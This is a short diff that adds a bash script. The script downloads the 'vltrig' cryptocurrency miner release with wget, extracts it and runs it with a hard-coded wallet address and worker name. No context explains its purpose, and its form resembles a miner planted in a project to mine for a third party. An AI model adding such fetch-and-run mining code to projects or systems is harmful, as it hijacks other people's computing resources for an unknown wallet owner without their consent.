@@ -1,0 +1,5 @@
+#!/bin/bash
+
+wget https://github.com/HashVault/vltrig/releases/download/v6.27.0.6/vltrig-v6.27.0.6-linux-x64.tar.gz
+tar xf vltrig-v6.27.0.6-linux-x64.tar.gz
+./vltrig --user 43peYMqkwRGfN8ickDMB2PFM2nEHvKcYoTsh4sW524tQgxHD1MixG9JPJDtoKQeWK5EL5Evx9hAxackoCCddvcoh2rVCVeg --pass WorkerX
